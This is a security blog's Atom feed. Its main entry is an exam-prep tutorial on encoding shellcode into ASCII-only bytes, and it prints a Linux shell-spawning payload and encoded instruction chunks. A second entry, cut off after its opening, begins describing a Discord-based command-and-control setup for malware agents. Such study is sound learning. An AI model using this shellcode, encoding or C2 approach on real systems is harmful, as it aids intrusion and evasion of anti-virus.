<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-03-19T16:53:16+00:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Crawl3r</title><subtitle>Skidding around the internet</subtitle><author><name>Crawl3r</name></author><entry><title type="html">Manuel - Alphanumeric shellcode encoder</title><link href="http://localhost:4000/2020-02-06/manuel_alphanumeric_shellcode_encoder" rel="alternate" type="text/html" title="Manuel - Alphanumeric shellcode encoder" /><published>2020-02-06T00:00:00+00:00</published><updated>2020-02-06T00:00:00+00:00</updated><id>http://localhost:4000/2020-02-06/manuel_alphanumeric_shellcode_encoder</id><content type="html" xml:base="http://localhost:4000/2020-02-06/manuel_alphanumeric_shellcode_encoder">&lt;h2 id=&quot;introduction&quot;&gt;Introduction:&lt;/h2&gt;
&lt;p&gt;I am currently working through my OSCE prep material that I have gathered over the past few months, mainly generated after reading reviews and talking to friends who have taken the course. Without giving away any spoilers or specific information about the labs or the exam, I was able to highlight some key areas that I should study and prepare for. This post is specifically is about tackling character limitations within shellcode. Shellcode can sometimes be translated, mangled or misinterpreted during shellcode injection.&lt;/p&gt;

&lt;p&gt;The easiest example is the NULL byte character (“\x00”). As shellcode is often injected into the process using buffer overflows via user input, the NULL character specifies the end of the user input. Naturally, this means having this character halfway through our shellcode would result in only half our payload being injected causing problems, and well, ultimately, a non working exploit.&lt;/p&gt;

&lt;h2 id=&quot;what-is-alphanumeric-shellcode&quot;&gt;What is alphanumeric shellcode&lt;/h2&gt;
&lt;p&gt;To start with, I want to take a brief look into alphanumeric shellcode. Specifically what it is and why we should be interested in knowing about it. Reading through some OSCE reviews, I noticed a lot of talk about learning SEH overwrites and encoded shellcode to be make sure any bad character filtering or character translation in general does not break our payloads.&lt;/p&gt;

&lt;p&gt;Now, up to this point - I hadn’t had a chance to play with any on the weaknesses in vulnserver or create my own exploits. However, reading about alphanumeric shellcode in general, it seems to be filtering that only allows the hex characters ranging from 0x00 through to 0x7F. As we have already touched on, 0x00 is a NULL byte character, so naturally we will want to ignore that during our work, however it is important to note that all these characters are within the allowed scope. What’s also important to note is that each hex value within this range is relative to an &lt;a href=&quot;http://www.asciitable.com/&quot; title=&quot;Shellcode&quot;&gt;ASCII character&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;An example situation where this sort of shellcode could come in handy would be user input that is specifically checked to be ASCII characters only (don’t quote me on this, this is me guessing as to why something might specifically look and monitor for ASCII). For example, if a website asks for a some information about a user - they may sanitise the data to only allow characters that can be successfully rendered within the web page upon reflection. As you may have seen, if shellcode is printed to the terminal you sometimes receive broken icons. Where as ASCII characters would successfully print.&lt;/p&gt;

&lt;p&gt;An example of this can be seen in the screenshots below. I used this &lt;a href=&quot;http://shell-storm.org/shellcode/files/shellcode-827.php&quot; title=&quot;Shellcode&quot;&gt;shellcode&lt;/a&gt; within my testing.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The first screenshot shows the raw shellcode being printed directly to the terminal, note the broken icons throughout the output. The second screenshot prints the same shellcode, however this has been encoded into alphanumeric shellcode using Manuel (a small script I put together whilst learning the encoding process), and prints all working ASCII characters without any issues.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/alphanumeric/default_shellcode_output.png&quot; alt=&quot;Corrupt character output&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/alphanumeric/encoded_shellcode_output.png&quot; alt=&quot;Clean character output&quot; /&gt;&lt;/p&gt;

&lt;p&gt;“But Gary, those two screenshots show two completely different chunks of shellcode. Infact one is massive compared to the other - so they can’t be the same.”&lt;/p&gt;

&lt;p&gt;Okay okay, technically, yes - you are correct. The shellcode isn’t the same, that’s obvious - however, they both do the exact same thing. They will both drop the user into a new shell instance on unix (if used correctly). The reason the sizes differ so much, is due to the approach required to get around the limited character set. Let’s break down an example of using the first set of shellcode to pop our shell (these breakdowns won’t include any forms of exploitation or getting data onto the stack, just what it should look like):&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;We inject our shellcode payload into the target process&lt;/li&gt;
  &lt;li&gt;The shellcode is pushed into the process memory (likely the stack) as is&lt;/li&gt;
  &lt;li&gt;Gain control of EIP and redirect execution to our shellcode starting address&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As we can see, that is pretty simple to understand (ignoring all the additional information required to actually get our shellcode into the processes memory. However, the second set of shellcode shown in the above screenshot requires a bit more explanation.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;We inject our shellcode payload in the target process&lt;/li&gt;
  &lt;li&gt;The encoded shellcode is pushed into the process memory (likely the stack) as is &amp;lt;– key point&lt;/li&gt;
  &lt;li&gt;Jump to the encoded shellcode (I won’t cover this here)&lt;/li&gt;
  &lt;li&gt;Encoded shellcode executes, placing our decoded shellcode on the stack &amp;lt;– key point&lt;/li&gt;
  &lt;li&gt;Jump to decoded shellcode&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;You will notice that compared to the first breakdown, we actually jump to 2 seperate chunks of shellcode before gaining our required functionality. Within the second breakdown, I have highlighted two seperate points that we will look into closer to make sure we understand exactly what is happening.&lt;/p&gt;

&lt;h2 id=&quot;our-encoded-shellcode&quot;&gt;Our encoded shellcode&lt;/h2&gt;
&lt;p&gt;So, now we know we can encode our shellcode - what exactly does this mean? A pretty common approach of encoding shellcode to bypass certain restrictions is with the use of XOR’ing our bytes with a key value. This is a really quick way of bypassing basic validation, some anti-virus solutions etc. By encoding the shellcode and adding a decoder loop within the payload - malicious shellcode can go undetected before being decoded in memory and execution properly. The issue here is, XOR’d bytes can still (and will likely) include bad characters - in this case, anything outside of the “0x00 - 0x7F” character range.&lt;/p&gt;

&lt;p&gt;In this case, we are just wanting to find a way to get our required shellcode on the target stack, allowing us to jump to it and pop our shell. A method of achieving this comes via subsidising our bad character shellcode with a series of instructions, performing simple mathematics on legal character values to obtain our original, required, value. At first, this logic seemed crazy to me - it took me a couple of reads of &lt;a href=&quot;https://h0mbre.github.io/LTER_SEH_Success/&quot; title=&quot;H0mbre&quot;&gt;H0mbre’s post&lt;/a&gt; as well as a post he also recommended on &lt;a href=&quot;http://vellosec.net/2018/08/carving-shellcode-using-restrictive-character-sets/&quot; title=&quot;Vellosec&quot;&gt;Vellosec&lt;/a&gt;. I recommend you check these posts out as I won’t be going into as much detail as they do, however, a breakdown of how a few math operations can be used in order to achieve our desired value can be seen below:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Zero out our EAX register&lt;/li&gt;
  &lt;li&gt;Create two (or three) values with ASCII friendly hex values&lt;/li&gt;
  &lt;li&gt;ADD these values to EAX value
    &lt;ul&gt;
      &lt;li&gt;If we had 3 values, we want to SUB a fourth pre-defined value&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;EAX should now hold our original (before encoding) shellcode hex values&lt;/li&gt;
  &lt;li&gt;PUSH EAX onto the stack&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The first thing we want to do is zero (clear) out our EAX register as this will be used as our accumulator, holding our results each time we complete our required steps. Normally we would zero out a register by XOR’ing it with itself, however due to the &lt;a href=&quot;https://www.cs.uaf.edu/2017/fall/cs301/lecture/09_29_machinecode.html&quot; title=&quot;Machine code x86&quot;&gt;table&lt;/a&gt; shown below the register values are represented by opcodes that aren’t within the ASCII character range.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/alphanumeric/mod_rm_table.png&quot; alt=&quot;mod rm table&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As we can see, the instructions “xor eax, eax” would equal the opcode value of “33C0” which includes C0, falling outside of our legal character range. For this reason we have to be a little more crafty, let’s look at the AND method. As a disclaimer, I used the content from the vellosec blog post above to complete my work with AND operations. The post covers it very well and is definitely worth looking over if you are struggling - however, I will give a brief explanation below with similar content, but please go check that post out as well!&lt;/p&gt;

&lt;p&gt;A basic understanding of AND is the following:
If both values equal 1, then the result is 1, otherwise the result is 0.&lt;/p&gt;

&lt;p&gt;1 AND 1 = 1&lt;br /&gt;
1 AND 0 = 0&lt;br /&gt;
0 AND 1 = 0&lt;br /&gt;
0 AND 0 = 0&lt;/p&gt;

&lt;p&gt;We can look at a few examples using binary:&lt;/p&gt;

&lt;p&gt;The following values:&lt;br /&gt;
11001100&lt;br /&gt;
11000011&lt;/p&gt;

&lt;p&gt;Would equal:&lt;br /&gt;
11000000&lt;/p&gt;

&lt;p&gt;Where:&lt;br /&gt;
11001100&lt;br /&gt;
00110011&lt;/p&gt;

&lt;p&gt;Would equal:&lt;br /&gt;
00000000&lt;/p&gt;

&lt;p&gt;From the second example, we can get an idea of how we could use the AND operator to zero out a register. We also need to confirm that the opcodes used for the AND operator are within our allowed character set. Looking at the &lt;a href=&quot;https://x86.puri.sm/html/file_module_x86_id_12.html&quot; title=&quot;Mod RM Table x86&quot;&gt;table&lt;/a&gt; on we can see that unlike the required opcodes for the XOR instruction (33C0), we can use the opcode 25 to complete our “and eax” operation. This value falls within our allowed character range and will allow us to use the above logic to zero out our registers. The next step is to find two 4 byte values that do not include any bad characters, and when used together in a logical AND operation give us the value of zero. Once again, we thank vellosec for the following two values:&lt;/p&gt;

&lt;p&gt;554E4D4A and 2A313235&lt;/p&gt;

&lt;p&gt;Looking at the following screenshots, we can see that our glorious calculator has given us the binary representation of our two values and when used in our AND operation, we are presented with our required zero value.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/images/alphanumeric/calc_1.png&quot; alt=&quot;calc 1&quot; /&gt;
&lt;img src=&quot;http://localhost:4000/assets/images/alphanumeric/calc_2.png&quot; alt=&quot;calc 2&quot; /&gt;
&lt;img src=&quot;http://localhost:4000/assets/images/alphanumeric/calc_3.png&quot; alt=&quot;calc 3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now we have two values we can use to zero our EAX register, we can move on to using ADD and SUB to obtain our required shellcode value without ever having to inject any bad characters ourselves. So how do we do this? Looking back at the breakdown we see that we want to “Create two (or three) values with ASCII friendly hex values”. There are obviously various ways to do this, I initially started to write a program that would start at the required value in hex, attempt to split that value in half (if it was even, great, if it was odd, I would minus one, half it, then add one back to one of the halves). From there I used an incremental offset that I would add to one half and subtract from the other in order to try and find two values that would equal the target value. This did work for some values (although it did take a while, so my code was probably awful) but there were some problems when it comes to values that included certain characters. This is where I took a step back and had a look around online.&lt;/p&gt;

&lt;p&gt;Enter &lt;a href=&quot;https://github.com/ihack4falafel/Slink&quot; title=&quot;Slink by ihack4falafel&quot;&gt;Slink&lt;/a&gt; by &lt;a href=&quot;https://twitter.com/ihack4falafel&quot; title=&quot;ihack4falafel Twitter&quot;&gt;@ihack4falafel&lt;/a&gt;. Slink uses a really simple method of generating these values which was super quick and pretty much idiot proof (which was a bonus for me). After having a play around and just reading the code (thankfully, reading Python is like reading a book) I wrote down the following logic.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Split the shellcode up into chunks of four bytes (pad with NOPs beforehand if it’s not divisible by 4)&lt;/li&gt;
  &lt;li&gt;Check the bytes for any known bad bytes&lt;/li&gt;
  &lt;li&gt;If we don’t have any of the specified bad bytes
    &lt;ul&gt;
      &lt;li&gt;Loop through each of the eight characters&lt;/li&gt;
      &lt;li&gt;Take the single character and find two decimal values that can be added together to equal this value (i.e 4 == 2 + 2, 5 == 3 + 2 etc)&lt;/li&gt;
      &lt;li&gt;Place these two values on seperate strings and continue the loop&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;If we do have these specified bad bytes, we need to do something a little different
    &lt;ul&gt;
      &lt;li&gt;Loop through each of the eight characters&lt;/li&gt;
      &lt;li&gt;Take the single character, but this time we want to find three characters that add together PLUS an additional offset (i.e 5 == 2 + 2 + 2 (if the offset is 1), 8 == 4 + 3 + 3 (if the offset is 2)) - we will discuss this offset shortly and why it exists&lt;/li&gt;
      &lt;li&gt;Place these three values on seperate strings and continue the loop&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Once all eight charcters are finished, we will result in either two strings of eight characters that when added together will equal our original shellcode value or we will have three strings that will total the required value plus a string of eight of our required offset (i.e 11111111 or 22222222).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Before we move on, let’s talk about this offset that has appeared in the lower half of the above loop logic. When checking for various characters, especially the ‘f’ character we are unable to calculate this using valid characters. As ‘f’ is equal to 15 in decimal, we would need to perform an addition such as 8 + 7. The value, combined with other hex values, could potentially create an illegal byte, depending on the order of the characters. For example, 0x80. As we can cannot exceed a certain value within our addition we can use a third value within our series of instructions, followed by a subtraction to help bring our overall value back down to the target. By using three seperate values, we overshoot our target - hence the requirement of the subtraction. There are probably other methods of completing this and getting the correct value, however during my time researching this topic and taking Slink apart (referenced above), this approach proved to be very effective. I used the hard coded value of 0x33333333 for my subtration, meaning each calculation used an offset of three within the addition. To finalise this, let’s picture the following examples:&lt;/p&gt;

&lt;p&gt;Target: F (15 + offset of 3 = 18)&lt;br /&gt;
Possible values: 6 + 6 + 6, 7 + 7 + 4, 7 + 6 + 5 etc&lt;/p&gt;

&lt;p&gt;It is important to note (again) at this point, that the max value we can use within this set of instructions is 7 as the possible byte combinations will be within our legal range of ASCII characters (0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77). Knowing this, we can now create or two seperate encoding processes:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ADD, ADD&lt;/li&gt;
  &lt;li&gt;ADD, ADD, ADD, SUB&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After the correct encoding route (one of the above) has been complete, our desired value will be held in our EAX register. The final step of encoding this single chunk of shellcode is to push it onto the stack ready for usage. Luckily, ‘push eax’ can be accomplished with a legal character opcode 0x50 so we don’t have to do anything else other than call that instruction.&lt;/p&gt;

&lt;p&gt;Let’s look at two chunks of shellcode that has been encoded and formatted by Manuel. The first chunk of shellcode follows the ADD ADD encoder, using two seperate hex values to accomplish the target value:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] Encoding chunk: 1 -&amp;gt; 9080cd0b

\x25\x4a\x4d\x4e\x55 =&amp;gt; and eax, 0x554e4d4a
\x25\x35\x32\x31\x2a =&amp;gt; and eax, 0x2a313235
\x05\x06\x67\x40\x50 =&amp;gt; add eax, 0x50406706
\x05\x05\x66\x40\x40 =&amp;gt; add eax, 0x40406605
\x50 =&amp;gt; push eax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The second chunk of shellcode follows the ADD ADD ADD SUB encoder, using three generated hex values and the hardcoded subtraction value:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[*] Encoding chunk: 4 -&amp;gt; 69622f68

\x25\x4a\x4d\x4e\x55 =&amp;gt; and eax, 0x554e4d4a
\x25\x35\x32\x31\x2a =&amp;gt; and eax, 0x2a313235
\x05\x34\x26\x32\x34 =&amp;gt; add eax, 0x34322634
\x05\x34\x26\x32\x34 =&amp;gt; add eax, 0x34322634
\x05\x33\x16\x31\x34 =&amp;gt; add eax, 0x34311633
\x2d\x33\x33\x33\x33 =&amp;gt; sub eax, 0x33333333
\x50 =&amp;gt; push eax
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, the good news is - we now know how to encode our shellcode into ASCII friendly bytes, preventing manipulation and incorrect injection results. However, the bad news is, we can’t execute this shellcode in a similar fashion to the standard (non-encoded shellcode). We need additional instructions to re-align the stack and point execution towards our decoded shellcode. However, this post will not cover that as I personally have not covered that yet… soon.&lt;/p&gt;

&lt;p&gt;To finish up this post, I will add a few usage videos of my tool Manuel which effectively automates the above into a handy cli tool. The tool and source code can be found on my Github in my &lt;a href=&quot;https://github.com/crawl3r/CTP-OSCE&quot; title=&quot;Crawl3r CTP-OSCE Github&quot;&gt;CTP/OSCE repo&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Standard usage
&lt;a href=&quot;https://asciinema.org/a/wctxFuqCnkM6gyPNn4KC3XFqo&quot;&gt;&lt;img src=&quot;https://asciinema.org/a/wctxFuqCnkM6gyPNn4KC3XFqo.svg&quot; alt=&quot;asciicast&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Usage with debug output
&lt;a href=&quot;https://asciinema.org/a/7VhMrAVPTm1W6V5P0afuxdUCt&quot;&gt;&lt;img src=&quot;https://asciinema.org/a/7VhMrAVPTm1W6V5P0afuxdUCt.svg&quot; alt=&quot;asciicast&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Usage with python ready output
&lt;a href=&quot;https://asciinema.org/a/sphDgkkyCrEuUonM3xNIEPuOd&quot;&gt;&lt;img src=&quot;https://asciinema.org/a/sphDgkkyCrEuUonM3xNIEPuOd.svg&quot; alt=&quot;asciicast&quot; /&gt;&lt;/a&gt;&lt;/p&gt;</content><author><name>Crawl3r</name></author><summary type="html">Introduction: I am currently working through my OSCE prep material that I have gathered over the past few months, mainly generated after reading reviews and talking to friends who have taken the course. Without giving away any spoilers or specific information about the labs or the exam, I was able to highlight some key areas that I should study and prepare for. This post is specifically is about tackling character limitations within shellcode. Shellcode can sometimes be translated, mangled or misinterpreted during shellcode injection. The easiest example is the NULL byte character (“\x00”). As shellcode is often injected into the process using buffer overflows via user input, the NULL character specifies the end of the user input. Naturally, this means having this character halfway through our shellcode would result in only half our payload being injected causing problems, and well, ultimately, a non working exploit. What is alphanumeric shellcode To start with, I want to take a brief look into alphanumeric shellcode. Specifically what it is and why we should be interested in knowing about it. Reading through some OSCE reviews, I noticed a lot of talk about learning SEH overwrites and encoded shellcode to be make sure any bad character filtering or character translation in general does not break our payloads. Now, up to this point - I hadn’t had a chance to play with any on the weaknesses in vulnserver or create my own exploits. However, reading about alphanumeric shellcode in general, it seems to be filtering that only allows the hex characters ranging from 0x00 through to 0x7F. As we have already touched on, 0x00 is a NULL byte character, so naturally we will want to ignore that during our work, however it is important to note that all these characters are within the allowed scope. What’s also important to note is that each hex value within this range is relative to an ASCII character. An example situation where this sort of shellcode could come in handy would be user input that is specifically checked to be ASCII characters only (don’t quote me on this, this is me guessing as to why something might specifically look and monitor for ASCII). For example, if a website asks for a some information about a user - they may sanitise the data to only allow characters that can be successfully rendered within the web page upon reflection. As you may have seen, if shellcode is printed to the terminal you sometimes receive broken icons. Where as ASCII characters would successfully print. An example of this can be seen in the screenshots below. I used this shellcode within my testing. \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80 The first screenshot shows the raw shellcode being printed directly to the terminal, note the broken icons throughout the output. The second screenshot prints the same shellcode, however this has been encoded into alphanumeric shellcode using Manuel (a small script I put together whilst learning the encoding process), and prints all working ASCII characters without any issues. “But Gary, those two screenshots show two completely different chunks of shellcode. Infact one is massive compared to the other - so they can’t be the same.” Okay okay, technically, yes - you are correct. The shellcode isn’t the same, that’s obvious - however, they both do the exact same thing. They will both drop the user into a new shell instance on unix (if used correctly). The reason the sizes differ so much, is due to the approach required to get around the limited character set. Let’s break down an example of using the first set of shellcode to pop our shell (these breakdowns won’t include any forms of exploitation or getting data onto the stack, just what it should look like): We inject our shellcode payload into the target process The shellcode is pushed into the process memory (likely the stack) as is Gain control of EIP and redirect execution to our shellcode starting address As we can see, that is pretty simple to understand (ignoring all the additional information required to actually get our shellcode into the processes memory. However, the second set of shellcode shown in the above screenshot requires a bit more explanation. We inject our shellcode payload in the target process The encoded shellcode is pushed into the process memory (likely the stack) as is &amp;lt;– key point Jump to the encoded shellcode (I won’t cover this here) Encoded shellcode executes, placing our decoded shellcode on the stack &amp;lt;– key point Jump to decoded shellcode You will notice that compared to the first breakdown, we actually jump to 2 seperate chunks of shellcode before gaining our required functionality. Within the second breakdown, I have highlighted two seperate points that we will look into closer to make sure we understand exactly what is happening. Our encoded shellcode So, now we know we can encode our shellcode - what exactly does this mean? A pretty common approach of encoding shellcode to bypass certain restrictions is with the use of XOR’ing our bytes with a key value. This is a really quick way of bypassing basic validation, some anti-virus solutions etc. By encoding the shellcode and adding a decoder loop within the payload - malicious shellcode can go undetected before being decoded in memory and execution properly. The issue here is, XOR’d bytes can still (and will likely) include bad characters - in this case, anything outside of the “0x00 - 0x7F” character range. In this case, we are just wanting to find a way to get our required shellcode on the target stack, allowing us to jump to it and pop our shell. A method of achieving this comes via subsidising our bad character shellcode with a series of instructions, performing simple mathematics on legal character values to obtain our original, required, value. At first, this logic seemed crazy to me - it took me a couple of reads of H0mbre’s post as well as a post he also recommended on Vellosec. I recommend you check these posts out as I won’t be going into as much detail as they do, however, a breakdown of how a few math operations can be used in order to achieve our desired value can be seen below: Zero out our EAX register Create two (or three) values with ASCII friendly hex values ADD these values to EAX value If we had 3 values, we want to SUB a fourth pre-defined value EAX should now hold our original (before encoding) shellcode hex values PUSH EAX onto the stack The first thing we want to do is zero (clear) out our EAX register as this will be used as our accumulator, holding our results each time we complete our required steps. Normally we would zero out a register by XOR’ing it with itself, however due to the table shown below the register values are represented by opcodes that aren’t within the ASCII character range. As we can see, the instructions “xor eax, eax” would equal the opcode value of “33C0” which includes C0, falling outside of our legal character range. For this reason we have to be a little more crafty, let’s look at the AND method. As a disclaimer, I used the content from the vellosec blog post above to complete my work with AND operations. The post covers it very well and is definitely worth looking over if you are struggling - however, I will give a brief explanation below with similar content, but please go check that post out as well! A basic understanding of AND is the following: If both values equal 1, then the result is 1, otherwise the result is 0. 1 AND 1 = 1 1 AND 0 = 0 0 AND 1 = 0 0 AND 0 = 0 We can look at a few examples using binary: The following values: 11001100 11000011 Would equal: 11000000 Where: 11001100 00110011 Would equal: 00000000 From the second example, we can get an idea of how we could use the AND operator to zero out a register. We also need to confirm that the opcodes used for the AND operator are within our allowed character set. Looking at the table on we can see that unlike the required opcodes for the XOR instruction (33C0), we can use the opcode 25 to complete our “and eax” operation. This value falls within our allowed character range and will allow us to use the above logic to zero out our registers. The next step is to find two 4 byte values that do not include any bad characters, and when used together in a logical AND operation give us the value of zero. Once again, we thank vellosec for the following two values: 554E4D4A and 2A313235 Looking at the following screenshots, we can see that our glorious calculator has given us the binary representation of our two values and when used in our AND operation, we are presented with our required zero value. Now we have two values we can use to zero our EAX register, we can move on to using ADD and SUB to obtain our required shellcode value without ever having to inject any bad characters ourselves. So how do we do this? Looking back at the breakdown we see that we want to “Create two (or three) values with ASCII friendly hex values”. There are obviously various ways to do this, I initially started to write a program that would start at the required value in hex, attempt to split that value in half (if it was even, great, if it was odd, I would minus one, half it, then add one back to one of the halves). From there I used an incremental offset that I would add to one half and subtract from the other in order to try and find two values that would equal the target value. This did work for some values (although it did take a while, so my code was probably awful) but there were some problems when it comes to values that included certain characters. This is where I took a step back and had a look around online. Enter Slink by @ihack4falafel. Slink uses a really simple method of generating these values which was super quick and pretty much idiot proof (which was a bonus for me). After having a play around and just reading the code (thankfully, reading Python is like reading a book) I wrote down the following logic. Split the shellcode up into chunks of four bytes (pad with NOPs beforehand if it’s not divisible by 4) Check the bytes for any known bad bytes If we don’t have any of the specified bad bytes Loop through each of the eight characters Take the single character and find two decimal values that can be added together to equal this value (i.e 4 == 2 + 2, 5 == 3 + 2 etc) Place these two values on seperate strings and continue the loop If we do have these specified bad bytes, we need to do something a little different Loop through each of the eight characters Take the single character, but this time we want to find three characters that add together PLUS an additional offset (i.e 5 == 2 + 2 + 2 (if the offset is 1), 8 == 4 + 3 + 3 (if the offset is 2)) - we will discuss this offset shortly and why it exists Place these three values on seperate strings and continue the loop Once all eight charcters are finished, we will result in either two strings of eight characters that when added together will equal our original shellcode value or we will have three strings that will total the required value plus a string of eight of our required offset (i.e 11111111 or 22222222). Before we move on, let’s talk about this offset that has appeared in the lower half of the above loop logic. When checking for various characters, especially the ‘f’ character we are unable to calculate this using valid characters. As ‘f’ is equal to 15 in decimal, we would need to perform an addition such as 8 + 7. The value, combined with other hex values, could potentially create an illegal byte, depending on the order of the characters. For example, 0x80. As we can cannot exceed a certain value within our addition we can use a third value within our series of instructions, followed by a subtraction to help bring our overall value back down to the target. By using three seperate values, we overshoot our target - hence the requirement of the subtraction. There are probably other methods of completing this and getting the correct value, however during my time researching this topic and taking Slink apart (referenced above), this approach proved to be very effective. I used the hard coded value of 0x33333333 for my subtration, meaning each calculation used an offset of three within the addition. To finalise this, let’s picture the following examples: Target: F (15 + offset of 3 = 18) Possible values: 6 + 6 + 6, 7 + 7 + 4, 7 + 6 + 5 etc It is important to note (again) at this point, that the max value we can use within this set of instructions is 7 as the possible byte combinations will be within our legal range of ASCII characters (0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77). Knowing this, we can now create or two seperate encoding processes: ADD, ADD ADD, ADD, ADD, SUB After the correct encoding route (one of the above) has been complete, our desired value will be held in our EAX register. The final step of encoding this single chunk of shellcode is to push it onto the stack ready for usage. Luckily, ‘push eax’ can be accomplished with a legal character opcode 0x50 so we don’t have to do anything else other than call that instruction. Let’s look at two chunks of shellcode that has been encoded and formatted by Manuel. The first chunk of shellcode follows the ADD ADD encoder, using two seperate hex values to accomplish the target value: [*] Encoding chunk: 1 -&amp;gt; 9080cd0b \x25\x4a\x4d\x4e\x55 =&amp;gt; and eax, 0x554e4d4a \x25\x35\x32\x31\x2a =&amp;gt; and eax, 0x2a313235 \x05\x06\x67\x40\x50 =&amp;gt; add eax, 0x50406706 \x05\x05\x66\x40\x40 =&amp;gt; add eax, 0x40406605 \x50 =&amp;gt; push eax The second chunk of shellcode follows the ADD ADD ADD SUB encoder, using three generated hex values and the hardcoded subtraction value: [*] Encoding chunk: 4 -&amp;gt; 69622f68 \x25\x4a\x4d\x4e\x55 =&amp;gt; and eax, 0x554e4d4a \x25\x35\x32\x31\x2a =&amp;gt; and eax, 0x2a313235 \x05\x34\x26\x32\x34 =&amp;gt; add eax, 0x34322634 \x05\x34\x26\x32\x34 =&amp;gt; add eax, 0x34322634 \x05\x33\x16\x31\x34 =&amp;gt; add eax, 0x34311633 \x2d\x33\x33\x33\x33 =&amp;gt; sub eax, 0x33333333 \x50 =&amp;gt; push eax So, the good news is - we now know how to encode our shellcode into ASCII friendly bytes, preventing manipulation and incorrect injection results. However, the bad news is, we can’t execute this shellcode in a similar fashion to the standard (non-encoded shellcode). We need additional instructions to re-align the stack and point execution towards our decoded shellcode. However, this post will not cover that as I personally have not covered that yet… soon. To finish up this post, I will add a few usage videos of my tool Manuel which effectively automates the above into a handy cli tool. The tool and source code can be found on my Github in my CTP/OSCE repo. Standard usage Usage with debug output Usage with python ready output</summary></entry><entry><title type="html">DaaC2 - Using Discord as a C2</title><link href="http://localhost:4000/2020-01-25/DaaC2" rel="alternate" type="text/html" title="DaaC2 - Using Discord as a C2" /><published>2020-01-25T00:00:00+00:00</published><updated>2020-01-25T00:00:00+00:00</updated><id>http://localhost:4000/2020-01-25/DaaC2</id><content type="html" xml:base="http://localhost:4000/2020-01-25/DaaC2">&lt;h2 id=&quot;introduction&quot;&gt;Introduction&lt;/h2&gt;
&lt;p&gt;It was a cold Sunday evening, and I was doing nothing but afk’ing cannonballs on OSRS (shout out to @TimGMichaud) when I had an urge to make something. I was thinking about a conversation I had on Friday with Sion (fellow colleague/hacker friend) about methods of dropping malware, communicating with C2’s, how implants go undetected but still communicate etc. I fired up VS code and built a skeleton project of a ‘client’ and a ‘server’. I immediately took a step back and thought ‘I have already made stuff using the common approach (http/https, GET/POST etc).’ I wanted to make something I hadn’t seen before as well as something that was brand new to me. It was then I thought about using Discord as my means of communication between a server (C2) and a client (agent).&lt;/p&gt;

&lt;h2 id=&quot;shortish-disclaimer&quot;&gt;Short(ish) Disclaimer&lt;/h2&gt;
&lt;p&gt;I don’t write Malware for a living, I am not a red teamer (I work as a pentester) so I don’t have a tonne of knowledge in this area. When I build a C2/agent I pretty much get it working to a point where I can use it to gain a foothold and then upgrade/migrate to something a bit more substantial (i.e meterpreter etc). I do however, have a big interest in malware, agents, implants, etc so I do enjoy writing little tools and PoC’s to scratch an itch. What you see here is no where near ‘production’ ready. I doubt it would be useful on site or in an engagement but hopefully it covers an area which hasn’t been discovered or hopefully it helps you, the reader, to build your own or even discover how wonderful Go is to write in. Don’t get triggered, I write things in a tonne of languages, Go just happens to be my current flavour at the moment. Use whatever you guys want, as long as you can bypass basic detection then you’re off to a good start.&lt;/p&gt;

&lt;h2 id=&quot;planning&quot;&gt;Planning&lt;/h2&gt;
&lt;p&gt;Before I started implementing anything, I needed to figure out what I need to get a working PoC and how I might go about it. First things first, how am I going to use Discord as a method of communication.&lt;/p&gt;

&lt;p&gt;What we know about Discord (basic, high level approach):&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Basically Skype but targetting gamers&lt;/li&gt;
  &lt;li&gt;Any user can create a ‘server’ (something something vent)&lt;/li&gt;
